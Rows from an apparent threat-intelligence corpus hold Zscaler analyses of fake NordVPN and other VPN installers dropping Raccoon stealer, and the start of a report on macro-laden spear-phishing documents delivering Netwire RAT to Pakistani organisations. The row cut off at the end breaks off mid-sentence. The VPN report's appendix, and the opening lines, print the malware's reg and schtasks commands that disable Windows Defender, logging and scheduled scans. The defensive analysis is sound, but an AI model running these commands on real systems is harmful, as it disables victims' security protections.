""DisableEnhancedNotifications"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG\_DWORD /d ""0"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SubmitSamplesConsent"" /t REG\_DWORD /d ""2"" /f"" reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v ""Start"" /t REG\_DWORD /d ""0"" /f"" reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger"" /v ""Start"" /t REG\_DWORD /d ""0"" /f"" reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"" /v ""SecurityHealth"" /f"" reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""SecurityHealth"" /f"" reg delete ""HKCR\*\shellex\ContextMenuHandlers\EPP"" /f"" reg delete ""HKCR\Directory\shellex\ContextMenuHandlers\EPP"" /f"" reg delete ""HKCR\Drive\shellex\ContextMenuHandlers\EPP"" /f"" reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v ""Start"" /t REG\_DWORD /d ""0"" /f reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger"" /v ""Start"" /t REG\_DWORD /d ""0"" /f reg add ""HKLM\System\CurrentControlSet\Services\WdBoot"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" reg add ""HKLM\System\CurrentControlSet\Services\WdFilter"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" reg add ""HKLM\System\CurrentControlSet\Services\WdNisDrv"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" reg add ""HKLM\System\CurrentControlSet\Services\WdNisSvc"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" reg add ""HKLM\System\CurrentControlSet\Services\WinDefend"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" **// Altering scheduled tasks on the machine related to security services.** schtasks /Change /TN ""Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Verification"" /Disable"
annoctr,annoctr/AnnoCTR/text/dev/zscaler_2021-05-21_threat-actors-distribute-malicious-vpn.txt,zscaler_2021-05-21_threat-actors-distribute-malicious-vpn,G0034,"Threat Actors Distribute Malicious VPN Apps Masquerading as Popular Vendors May 21, 2021 ### **Introduction** In May 2021, Zscaler ThreatLabZ observed several new domains registered by a threat actor for distribution of spoofed and malicious versions of popular VPN softwares. Threat actors have shifted their tactics, techniques, and procedures (TTPs) to target VPN users over the past year, taking advantage of the increase in remote work and the popularity of VPN applications. We observed this particular actor spoofing VPN applications, such as NordVPN, F-secure Freedom VPN, Avast Secureline VPN, and Hotspot Shield, to distribute the infostealer known as Raccoon stealer. Several lookalike websites containing malicious download links were hosted on domains registered by the actor in May 2021 using the Njalla domain hosting provider. Njalla has been used in the past by advanced persistent threat (APT) actors, such as Lazarus and Sandworm. ThreatLabZ closely monitors the network infrastructure used by these threat actors, which led to the discovery of this campaign. For this blog, we performed a deep-dive technical analysis of the malicious setup files, the evasion techniques used, and the final payload delivered. ### **Attack flow** The attack starts when users visit a lookalike website registered by the threat actor to distribute VPN applications. As an example, **the domain: vpnnords[.]com** was registered by the attacker and used to host the webpage as shown in Figure 1. This page looks almost identical to the homepage of the legitimate NordVPN website. The only difference is that the “Download Free” button on this page leads to the download of a malicious NordVPN setup file hosted on a file-sharing website. The complete list of domains registered by the attacker to target VPN users is included in the IOCs section. ![Figure 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%201.png) *Figure 1: Malicious webpage that looks similar to the legitimate NordVPN website* Download link of setup file: hxxps://filetransfer[.]io/data-package/tZCy19qQ/download The downloaded file looks like a legitimate setup file of NordVPN—it uses the same file icon and even displays the graphical user interface (GUI) of NordVPN—but performs malicious activities in the background, which we describe in detail in the technical analysis section. ### **Low detection by security vendors** All the domains used in this attack and registered by the threat actor have no detection on VirusTotal and all security vendors mark these domains as clean. One such example is shown in Figure 2. ![Figure 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%202.png) *Figure 2: No detection for the malicious domain(s) on VirusTotal by security vendors* This highlights how this attack has been flying under the radar and the importance of proactive hunting techniques, which helped us discover these domains. ### **Technical analysis** For the purpose of technical analysis, we will consider the file with the MD5 hash: e157f55aff49fe53befa3484d5e2b575 ### **Static analysis** Similar to the legitimate NordVPN setup file, the fake NordVPN setup is packaged using Inno Installer, but the file structure inside the package is different. Figure 3 below shows the file structure for both legit and fake setup. ![Figure 3](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%203_1.png) *Figure 3: File structure for Inno-packaged fake and legitimate NordVPN setup files* ### **[+] Inside the fake installation package** As shown in Figure 3 above, the package contains the following files. * **Legitimate NordVPN setup – NordVPNSetup.exe**. The NordVPNSetup.exe is the latest version of NordVPN with **MD5 hash: 4e6183906dfe035954ec0260c573ab03** * **Seven files for performing different malicious operations.** These files are described in more detail in the **“Component analysis”** section * **The Inno package installer script – install\_script.iss.** All the files inside the package are encrypted using a password as defined in the **[Setup] section** of the installer script **Note:** The Inno package installer script for the fake NordVPN setup is available in the appendix section ### **[+] Component analysis** In this section, we perform a technical analysis of the individual components packaged inside the malicious setup file. **Naming convention of component files** All the script (VBS and BAT) file components in this package follow a naming convention. The first few characters indicate the purpose of the script followed by an array of random characters appended to it. **Example:** # STRT indicates starting or initialization STRTbbbn7przuvwav4hbpbps.vbs = “STRT” + “bbbn7przuvwav4hbpbps” + “.vbs” # AVD indicates AV disable AVDbbbn7i3b4ho55ck6raahj.bat = “AVD” + “bbbn7i3b4ho55ck6raahj” + “.bat” # DEL indicates delete the components and cleanup DELbbbn7l3bnchd166d2hhhv.bat = “DEL” + “bbbn7l3bnchd166d2hhhv” + “.bat” #### **VBScript analysis** **MD5 hash**: b5d6f5e514757d7b075ed59d79b8f2e2 **Filename**: STRTbbbn7przuvwav4hbpbps.vbs This VBScript is big in size because of the inclusion of junk instructions, which declare a lot of variables that are not used anywhere in the code. After cleaning up, the script looks like shown in Figure 4. ![Figure 4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%204.png) *Figure 4: Cleaned up VBScript.* The main purpose of this script is to execute the three BAT files, described in the next section. The VBScript creates a delay between the execution of each BAT script using a random delay parameter, calculated as follows. Dim max,min max=9890 min=4890 Dim RNDM Randomize RNDM=((max)*Rnd+min) #### **BAT files analysis** **[Component #1: Disable security softwares]** **MD5 hash:** 7924178f4a19db114e1fbb2764b8b409 **Filename:** AVDbbbn7i3b4ho55ck6raahj.bat This BAT file is mainly responsible for disabling security software on the machine. It specifically targets Windows Defender and Exploit Guard. To disable the security service features, it leverages *reg.exe* to alter the Windows registry keys specific to Windows Defender and Exploit Guard. In addition, the file disables system services and scheduled tasks related to Windows Defender. Similar to the VBS file, this BAT file is large. This is because long strings of Base64-encoded data are included in the file and the commands are inserted between them, as shown in Figure 5. ![Figure 5](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%205.png) *Figure 5: Commands inserted between Base64-encoded blobs in the BAT file* The complete list of commands executed by this BAT file to disable security services and features is included in Appendix. **[Component #2: Main]** **MD5 hash:** b3a6b11fcf113f692648bc8f0f3f898e **Filename:** main.bat This BAT file uses a byte order mark (BOM) in the first two bytes, in which it displays only Unicode characters when the file is opened using Notepad++ or any other text editor. The first two bytes are {0xFF 0xFE} as shown in Figure 6. ![Figure 6](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%206.png) *Figure 6: Byte order mark (BOM) inserted in first two bytes of the BAT file* Once we delete these two bytes, we can view the contents successfully with a text editor, such as Notepad++, as shown in Figure 7. ![Figure 7](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%207.png) Figure 7: Cleaned BAT file The main actions performed by this BAT file are: 1.Creates a temp directory called ""extracted"" in the current directory 2.Renames the encrypted file.bin to file.zip 3.Decrypts and extracts the contents of file.zip using the password: ""\_\_\_\_\_\_\_\_\_\_\_7876pwd4897pwd19506\_\_\_\_\_\_\_\_\_\_\_"" 4.Extracts all the components after decrypting and renames file.zip to file.bin 5.Executes sihost.exe After further analysis, we discovered that an open-source anti-antivirus obfuscator was used to package the files. This obfuscator will generate a BAT file and package everything using 7zip to create an encrypted and password-protected, multilayer archive file. This GitHub project was used by the threat actor: https://github.com/hXR16F/AntiAV In our case, the archive file is called file.bin **MD5 hash**: b2880d44773178644ff13d755e96d5e2 **FIlename**: file.bin This is an encrypted ZIP archive that, when decrypted, with the password *“\_\_\_\_\_\_\_\_\_\_\_7876pwd4897pwd19506\_\_\_\_\_\_\_\_\_\_\_”* contains the following main components: AntiAV.data Sihost.exe - 32-bit .NET Binary **[Component #3: Cleanup]** **MD5 hash:** 228c709d87e5ff50e7d5c05b1a7f6c03 **Filename:** DELbbbn7l3bnchd166d2hhhv.bat Deletes all the components that were used in the initialization stage of the setup. @echo off timeout /T 60 /NOBREAK > Nul Del /f /q ""AVDbbbn7i3b4ho55ck6raahj.bat"" Del /f /q ""STRTbbbn7przuvwav4hbpbps.vbs"" Del /f /q ""STR2bbbn7przuvwav4hbpbps.vbs"" Del /f /q ""7z.dll"" Del /f /q ""7z.exe"" Del /f /q ""main.bat"" Del /f /q ""file.bin"" Del /f /q ""LODbbbn7pkeaxe7obg0ydlex.bat"" Del /f /q ""DELbbbn7l3bnchd166d2hhhv.bat"" ### **Dynamic analysis** When the Inno packaged fake NordVPN setup is executed, it extracts the legitimate NordVPN setup file to the path: *""%ProgramFiles%\"" or ""%ProgramFiles(x86)%\""*, while all the malicious operation-related files are extracted to the path *""%SystemDrive%\ProgramData\SZUCiTYO44EalgWu\""*. As per the [Run] section of the installer Inno script, the legitimate NordVPN setup is executed first, followed by the malicious VBScript execution. Operating in this order prevents the end-user from suspecting that any malicious activity is being performed on the user's machine. Figure 8 below shows the installation window that is displayed to the end-user as a result of legitimate NordVPN setup execution, while the malicious activity is being performed in the background. ![Figure 8](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%208.png) *Figure 8: Installation window shown to the end-user* **[+] .Net binary analysis** As described earlier, the VBS and BAT scripts' execution finally results in dropping and executing the .NET binary with the name, sihost.exe. Similar to all the payloads in the infection chain, the .NET binary is obfuscated and consists of multiple layers that make binary analysis difficult and help to bypass the AV products. **// Main binary** The main binary has the project name **“StarEggControl”**. On execution, it loads the next layer binary, which is stored as an image in the resource section with the full resource path **“StarEggControl.frmSolucao2.image1”** and it is constructed using individual pixel information from the stored image. The code responsible for binary construction is shown in Figure 9 below. ![Figure 9](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%209.png) *Figure 9: Image to binary construction using individual pixels* Once the binary construction is complete, the binary is loaded as a runtime module. The module is a .NET DLL with the name SampleUI.dll. Code execution is transferred to this DLL by calling SampleUI.MDI class with three parameters: **ugz1:** ""54776F5061746873"" – Encoded resource name for next layer binary **ugz3:** ""59596A6F71"" – Encoded key which is used to decrypt the next layer binary **projname:** “StarEggControl” – Project name of main .NET binary **// SampleUI.dll** Similar to the previous layer, the SampleUI.dll also loads the next layer binary, which is stored as a bitmap image inside the resources of the main binary itself. The resource name when decoded using the parameter ugz1 is: **""TwoPaths""** and the full resource path is: **“StarEggControl.Resources.TwoPaths”**. The next-layer binary is constructed from the retrieved Bitmap image using a custom algorithm implementation that uses XOR operation. The XOR key is derived using the parameter *ugz3* which turns out to be **""YYjoq""**. The constructed binary is again loaded as a runtime module, which is also a .NET DLL with the name **“公jrxl的A太 wCe”**. Code execution is transferred to the DLL by calling the class with the name: **“公jrxl的A太 wCe.d司J物rU族家的v行是o.z官司C生bqT的A”.** Please note that the class and method names inside the .NET binary contain Unicode characters to deter the process of static analysis and reverse engineering. Figure 10 below shows the code flow for binary construction, loading, and transfer of code execution. ![Figure 10](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%2010.png) *Figure 10: Decoding the bitmap to binary and transferring execution* **// 公jrxl的A太 wCe** This is the final layer, which is responsible for loading and executing the main malware payload of the infection chain. The malware payload is stored among the resources of this final layer DLL with the resource name **“ifF3K”**. Like previous layers, the main malware payload is present in encrypted form. Executing further, the malware payload is decrypted, a new suspended version of the main .NET binary sihost.exe is created, and the malware payload is injected into the suspended process using the Hollow Process Injection technique. The injected malware payload is the well-known information stealerknown as Raccoon stealer. ### **Similar builds but different themes** Pivoting on the package build, we found more than 500 samples (more than 50% of these samples have less than 10 detections) and two additional themes being used to deliver malware payload—one was related to multimedia applications and the other to security softwares. We have not confirmed whether the Raccoon stealer is the final payload for all the samples, but they seem similar to the current attack. ### **Zscaler Cloud Sandbox report** ![Figure 11](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%2011.png) *Figure 11: Zscaler Cloud Sandbox report* In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels. - [HTML.MalURL.NordVPN](https://threatlibrary.zscaler.com/?keyword=HTML.MalURL.NordVPN) - [Win32.PWS.Raccoon](https://threatlibrary.zscaler.com/?keyword=Win32.PWS.Raccoon) ### **MITRE ATT&CK TTP mapping** | **ID** | **Tactic** | **Technique** | | T1566 | Phishing | Attacker hosted fake websites leading to malicious file download | | T1204.002 | User Execution: Malicious File | User executes the downloaded file | | T1140 | Deobfuscate/Decode Files or Information | Strings and other data are obfuscated in the payloads | | T1027.002 | Obfuscated Files or Information: Software Packing | Payloads are packed in layers | | T1070.004 | Indicator Removal on Host: File Deletion | Deletes all the components which were used in the initialization stage | | T1055.012 | Process Injection: Process Hollowing | Use hollow process injection technique to execute the final malware payload | | T1562 | Impair Defenses | Disables Windows Defender features and log audits | | T1124 | System Time Discovery | One of Raccoon capabilities | | T1087 | Account Discovery | One of Raccoon capabilities | | T1124 | File and Directory Discovery | One of Raccoon capabilities | | T1057 | Process Discovery | One of Raccoon capabilities | | T1012 | Query Registry | One of Raccoon capabilities | | T1113 | Screen Capture | One of Raccoon capabilities | | T1082 | System Information Discovery | One of Raccoon capabilities | | T1016 | System Network Configuration Discovery | One of Raccoon capabilities | | T1573.001 | Encrypted Channel: Symmetric Cryptography | One of Raccoon capabilities | ### ### **Indicators of compromise** **Hashes** | **MD5** | **Description** | | e157f55aff49fe53befa3484d5e2b575 | NordVPNsetup.exe | | b5d6f5e514757d7b075ed59d79b8f2e2 | STRTbbbn7przuvwav4hbpbps.vbs | | 7924178f4a19db114e1fbb2764b8b409 | AVDbbbn7i3b4ho55ck6raahj.bat | | b3a6b11fcf113f692648bc8f0f3f898e | main.bat | | 228c709d87e5ff50e7d5c05b1a7f6c03 | DELbbbn7l3bnchd166d2hhhv.bat | | b2880d44773178644ff13d755e96d5e2 | file.bin | | 0d2acc1da9ea3c2f98bcbc3ce872beb7 | Raccoon Stealer | **// Few other VPN packages** | **MD5** | **Description** | | 67516c2a72880e674795b0a9a1edcb36 | FSecureFreedomeVPN.exe | | fabc80d1a8c2c580f04550c34247e24d | avast\_vpn\_online\_setup.x64.exe | **Malicious domains** vpnnords[.]com nordsfreevpn[.]com nordsecure[.]click vpn-nord[.]net **Dropped files** %ProgramFiles%\NordVPNSetup.exe OR %ProgramFiles(x86)%\NordVPNSetup.exe %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\7z.exe %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\7z.dll %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\file.bin %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\main.bat %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\AVDbbbn7i3b4ho55ck6raahj.bat %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\DELbbbn7l3bnchd166d2hhhv.bat %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\STRTbbbn7przuvwav4hbpbps.vbs %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\sihost.exe ### **Appendix** **// install\_script.iss from fake NordVPN Inno package** ;InnoSetupVersion=6.0.0 (Unicode) **[Setup]** AppName=SZUCiTYOSZUCiTYO IJiEalgWu AppId=SZUCiTYOSZUCiTYO IJiEalgWu AppVersion=44.9.9.9440 AppPublisher=EalgWuSZUCiTYOIJi EalgWu DefaultDirName={autopf} OutputBaseFilename=NordVPNSetup Compression=lzma ; Encryption=yes ; PasswordHash=b525fbe0090152aa48b9e832d1c72bdc48e94461 ; PasswordSalt=702a76b833fdb38f Uninstallable=no DisableDirPage=yes DisableProgramGroupPage=yes WizardImageFile=embedded\WizardImage0.bmp WizardSmallImageFile=embedded\WizardSmallImage0.bmp **[Files]** Source: ""{app}\NordVPNSetup.exe""; DestDir: ""{app}""; MinVersion: 0.0,6.0; Flags: deleteafterinstall ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\7z.exe""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\7z.dll""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\file.bin""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\main.bat""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\AVDbbbn7i3b4ho55ck6raahj.bat""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\DELbbbn7l3bnchd166d2hhhv.bat""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\STRTbbbn7przuvwav4hbpbps.vbs""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion **[Run]** Filename: ""{app}\NordVPNSetup.exe""; Description: ""{cm:LaunchProgram,SZUCiTYOSZUCiTYO IJiEalgWu}""; MinVersion: 0.0,6.0; Flags: postinstall skipifsilent nowait Filename: ""{sd}\ProgramData\SZUCiTYO44EalgWu\STRTbbbn7przuvwav4hbpbps.vbs""; Description: ""{cm:LaunchProgram,Generator}""; MinVersion: 0.0,6.0; Flags: shellexec nowait **[CustomMessages]** default.NameAndVersion=%1 version %2 default.AdditionalIcons=Additional shortcuts: default.CreateDesktopIcon=Create a &desktop shortcut default.CreateQuickLaunchIcon=Create a &Quick Launch shortcut default.ProgramOnTheWeb=%1 on the Web default.UninstallProgram=Uninstall %1 default.LaunchProgram=Launch %1 default.AssocFileExtension=&Associate %1 with the %2 file extension default.AssocingFileExtension=Associating %1 with the %2 file extension... default.AutoStartProgramGroupDescription=Startup: default.AutoStartProgram=Automatically start %1 default.AddonHostProgramNotFound=%1 could not be located in the folder you selected.%n%nDo you want to continue anyway. **[Languages]** ; These files are stubs ; To achieve better results after recompilation, use the real language files Name: ""default""; MessagesFile: ""embedded\default.isl""; **// Commands executed to disable system security services** reg add ""HKLM\Software\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG\_DWORD /d ""0"" /f"" reg delete ""HKLM\Software\Policies\Microsoft\Windows Defender"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG\_DWORD /d ""0"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG\_DWORD /d ""0"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SubmitSamplesConsent"" /t REG\_DWORD /d ""2"" /f"" reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v ""Start"" /t REG\_DWORD /d ""0"" /f"" reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger"" /v ""Start"" /t REG\_DWORD /d ""0"" /f"" reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"" /v ""SecurityHealth"" /f"" reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""SecurityHealth"" /f"" reg delete ""HKCR\*\shellex\ContextMenuHandlers\EPP"" /f"" reg delete ""HKCR\Directory\shellex\ContextMenuHandlers\EPP"" /f"" reg delete ""HKCR\Drive\shellex\ContextMenuHandlers\EPP"" /f"" reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v ""Start"" /t REG\_DWORD /d ""0"" /f reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger"" /v ""Start"" /t REG\_DWORD /d ""0"" /f reg add ""HKLM\System\CurrentControlSet\Services\WdBoot"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" reg add ""HKLM\System\CurrentControlSet\Services\WdFilter"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" reg add ""HKLM\System\CurrentControlSet\Services\WdNisDrv"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" reg add ""HKLM\System\CurrentControlSet\Services\WdNisSvc"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" reg add ""HKLM\System\CurrentControlSet\Services\WinDefend"" /v ""Start"" /t REG\_DWORD /d ""4"" /f"" **// Altering scheduled tasks on the machine related to security services.** schtasks /Change /TN ""Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Verification"" /Disable"
annoctr,annoctr/AnnoCTR/text/dev/zscaler_2021-07-14_targeted-attack-government-organizations-delivers.txt,zscaler_2021-07-14_targeted-attack-government-organizations-delivers,G0064,"Targeted Attack on Government Organizations Delivers Netwire RAT July 14, 2021 The Zscaler ThreatLabz team has observed an interesting spear phishing campaign beginning July 2021 in which a threat actor is targeting a wide range of organizations in Pakistan. NetwiredRC is being used as the final payload in this attack campaign. The combination of spear phishing and the use of information stealing RAT indicates that this is not a simple cyber crime, but a larger cyberattack campaign targeting multiple government organizations in Pakistan along with other industry verticals. **Attack Cycle** ![Attack chain infographic](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Attack%20chain%20infographic.png) *Figure 1: Attack chain* **Key features of this attack** 1.The attack has targeted multiple Pakistani government organizations using spear phishing emails. 2.Lures use email info stolen from the actual website of the Pakistan government (*Ministry of Information technology and telecommunication*). 3.The attack downloads its payload from the compromised website of the National College of Nepal located in Kathmandu. 4.NetwireRAT, a well-known malware for stealing sensitive information, is being used as the final payload in the attack. 5.Stolen information is sent using a proxy server in obfuscated form using the api *WinHttpGetIEProxyConfigForCurrentUser()* to command and control server 66[.]42.43.177:443 One of the latest spearphishing emails was sent from a spoofed email ID <[[email protected]](/cdn-cgi/l/email-protection)> masquerading as “National Cyber Security Policy Feedback,” impersonating a government account which may be known by the target. During analysis, we found that the originating IP of the email is 209[.]58.188.82 which belongs to Hong Kong and has been [reported](https://www.abuseipdb.com/check/209.58.188.82) for multiple phishing attacks in the past. ![Spoofed email from <feedback.ncsp@moitt.gov.pk>](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/email.PNG) *Figure 2: Spoofed email from <[[email protected]](/cdn-cgi/l/email-protection#3a5c5f5f5e585b5951145459494a7a5755534e4e145d554c144a51)>* The email was sent on Wednesday, June 30, 2021 10:44 AM (PKT) with the subject “Cyber Security Policy Consultation Draft Final Update” to lure the recipients into opening an attached file named “NSCP-DRAFT-Final.docm”. The mail body contained information on the latest updates of the National Cyber Security Policy Draft along with the signature of a senior official to make the email look more professional and genuine. Upon further research, it seems that the email info has been copied from the Ministry of Information Technology & Telecommunication site. ![Email info from MoITT site.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/moiTT.jpg) *Figure 3: Email info from MoITT site.* Digging into the message source of the email, we can see that the spearphishing email is targeting users from a number of different industry verticals. ![Recipients email id from Message Source](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/users%20recieved%20email.PNG) *Figure 4: Originating IP and recipient email IDs from Message Source* Looking at the Email ID of multiple users, we can see that multiple sectors are being targeted by the threat actor, including Energy, Agricultural, Chemicals, Educational, Telecommunication and Financial Sectors, among others. **Distribution Strategy** We have observed multiple documents being delivered in various spearphishing attacks. All the documents have exactly the same macro content with the same URL to download the final payload. 1.The first document we analyzed has a macro code containing a PowerShell script to download the final payload and execute it. **MD5 Hash: 22DF783F7881A7F6973028E21CA19D4F File Name: NSCP-DRAFT-Final.docm** ![Attached Docm file prompts to enable Macro.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20Docm%20file%20asking%20to%20enable%20macro.PNG) *Figure 5: Attached .Docm file prompts the user to enable macros* 2.The second document we analyzed has a different title and slightly different text, but is otherwise extremely similar to the first document, and also has a macro code containing a PowerShell script to download the final payload and execute it. **MD5 Hash: AB5DAC030DC5FC9ED802C0322168558B File Name: SCO-Cyber-Advisory.docm** ![Another docm file having malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/2nd%20Docm%20file%20asking%20to%20enable%20macro.PNG) *Figure 6: Another malicious .docm file* 3.The third document we analyzed is also very similar to the first two instances. It contains a macro code containing a PowerShell script to download the final payload and execute it. The content displayed in this document masquerades as a lab handbook related to Institute of Space Technology (IST), Islamabad. **MD5 Hash: B6EC09770ED5B34922B0CF56CB17BC95 File Name: Press Note July-SCO.docm** ![Another similar docm having malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/3rd%20Docm%20file%20asking%20to%20enable%20macro.PNG) *Figure 7: Another similar .docm with a malicious macro* **Technical Analysis of the macro** Once the document is opened, attackers try to trick the user by prompting them to enable macros to read the complete document. Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro with base-64 encoded URL. The macro downloads the final payload and path to save and execute the payload with the help of a PowerShell command. ![Macro code having based 64 encoded URL](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20macro%20code.PNG) *Figure 8: Macro code with base 64 encoded URL* The two functions performed by the macro code are: a.Download the payload from the given URL in the macro code. b.Save and execute the payload from the specified path in the macro code. Upon decryption, we get the URL which seems to be a recently compromised website belonging to the National College of Nepal located in Kathmandu. “***hxxps://nationalcollege.edu[.]np/admin/assets/js/jquery/tiny/plugins/anchor/.anchor/sysWow64.exe***” ![Decrypted Macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20decrypted%20macro.PNG) *Figure 9: Decrypted Macro code* File Path: <*C:\Windows\System32\spool\drivers\color\sysWow64.exe*> **Technical Analysis of the payload** Once PowerShell downloads the final payload (NetwiredRC), it copies itself to the above mentioned path from where it gets executed. NetwireRAT is not a new malware/RAT on the surface. First seen in 2012, it attempts to steal victims' passwords, including login credentials, FTP credentials, credit card data etc. It claims to be available in all OS formats including MacOS, Android and Windows. NetWireRAT is believed to have been used by the Iranian Nation state sponsored group APT33/Elfin back in 2016. Once executed on the victim’s machine, several anti-analysis techniques are used to protect it from analysis. This version of 